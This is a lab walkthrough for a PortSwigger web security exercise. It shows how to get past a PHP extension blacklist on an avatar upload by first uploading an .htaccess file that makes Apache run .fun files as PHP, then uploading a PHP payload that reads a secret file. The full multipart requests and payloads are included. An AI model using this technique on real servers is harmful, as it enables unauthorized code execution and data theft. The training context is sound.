# [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

> uploading a malicious php file as an avatar while php is blacklisted

- boot up burp suite
- log in
- upload an image (any small image)
- go back to the profile page
- check the burp suite proxy history (turn filters off if necessary)
- there is a request for the image upload `/my-account/avatar`
- there is a request for the image for avatar `/files/avatars/image.jpg`
- send both to the repeater

> upload exploit

- check the `/my-account/avatar` in the repeater

```
POST /my-account/avatar HTTP/2
...
------WebKitFormBoundaryk8j5XzBtGCT4dMop
Content-Disposition: form-data; name="avatar"; filename="black.jpg"
Content-Type: image/jpeg

<image data>

------WebKitFormBoundaryk8j5XzBtGCT4dMop
...
```

- update the image header and data to

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- send it
- the server will respond

```
HTTP/2 403 Forbidden
...
Server: Apache/2.4.41 (Ubuntu)
...
Sorry, php files are not allowed
...
```

- it is an `Apache` webserver

> `Apache` webserver exploit

**`Apache` has config files named `.htaccess`, these files are read during runtime to determine what files can be read from the actual folder or child folder**

```
/var/www/html/.htaccess
/var/www/html/files/.htaccess
/var/www/html/files/avatars/
```

- change the original image header/data again to `Apache` exploit

```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .fun
```

- after the upload would add a `.htaccess` file to the avatar folder

```
/var/www/html/.htaccess
/var/www/html/files/.htaccess
/var/www/html/files/avatars/.htaccess <- the uploaded one
```

- it configs `Apache` to read/execute any file with extension `.fun` as a php file

> final exploit

- change back the image header/data again to the original exploit with different extension

```
Content-Disposition: form-data; name="avatar"; filename="exploit.fun"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- in the repeater switch to the `/files/avatars/image.jpg` request
- change the `/files/avatars/image.jpg` request to `/files/avatars/exploit.fun`
- send it
